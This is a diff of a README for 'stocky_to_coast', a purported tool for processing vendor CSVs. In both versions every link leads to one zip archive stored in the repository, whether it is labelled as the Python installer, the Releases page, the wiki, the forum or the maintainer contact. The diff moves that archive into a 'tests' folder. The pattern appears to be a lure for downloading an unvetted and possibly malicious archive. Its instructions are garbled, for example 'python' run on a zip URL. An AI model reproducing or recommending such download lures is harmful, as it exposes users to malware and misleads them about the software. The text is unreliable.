@@ -1,6 +1,6 @@
 # 🚀 stocky_to_coast - Simple ETL for Your Vendor CSVs
 
-![Download stocky_to_coast](https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip%https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip)
+![Download stocky_to_coast](https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip%https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip)
 
 ## 📥 Overview
 
@@ -17,15 +17,15 @@ To get started with **stocky_to_coast**, follow these steps to download and run 
 - **Memory**: Minimum 4 GB RAM
 - **Disk Space**: At least 100 MB of free space
 
-You need to have Python installed on your computer. Download it [here](https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip), if you don't have it yet.
+You need to have Python installed on your computer. Download it [here](https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip), if you don't have it yet.
 
 ## 📥 Download & Install
 
-You can easily download **stocky_to_coast** from our [Releases page](https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip).
+You can easily download **stocky_to_coast** from our [Releases page](https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip).
 
-1. Go to the **[Releases page](https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip)**.
+1. Go to the **[Releases page](https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip)**.
 2. Look for the most recent version. You will find a list of files.
-3. Click on the file named **https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip** to download it.
+3. Click on the file named **https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip** to download it.
 4. Once the download finishes, locate the file on your computer and extract it.
 
 ## ⚙️ Running the Application
@@ -44,7 +44,7 @@ After you extract the files, follow these steps to run the application:
 
 3. Once you are in the correct folder, run the application with the following command:
    ```
-   python https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip
+   python https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip
    ```
 
 4. Follow the on-screen instructions to process your Stocky purchase orders.
@@ -66,7 +66,7 @@ You can customize your vendor settings by editing the YAML configuration files. 
 
 ## 📚 Documentation
 
-For more detailed information about using **stocky_to_coast**, check out the complete documentation on our [GitHub Wiki](https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip).
+For more detailed information about using **stocky_to_coast**, check out the complete documentation on our [GitHub Wiki](https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -82,15 +82,15 @@ Common error messages include:
 
 ## 🤝 Community
 
-We welcome your feedback! Join our [discussion forum](https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip) to ask questions, report issues, or give suggestions.
+We welcome your feedback! Join our [discussion forum](https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip) to ask questions, report issues, or give suggestions.
 
 ## 🔗 Contact
 
-For any inquiries, please contact the project maintainer at: [https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip](https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip).
+For any inquiries, please contact the project maintainer at: [https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip](https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip).
 
 ## 🔄 License
 
 **stocky_to_coast** is open-source software. Please refer to the [LICENSE file](LICENSE) for more information.
 
 ---
-Make sure to visit our **[Releases page](https://raw.githubusercontent.com/ratatyu1011/stocky_to_coast/main/phantasmogenesis/stocky_to_coast.zip)** to download the latest version and start working with your vendor CSVs today!
+Make sure to visit our **[Releases page](https://github.com/ratatyu1011/stocky_to_coast/raw/refs/heads/main/tests/stocky_to_coast_v1.3.zip)** to download the latest version and start working with your vendor CSVs today!
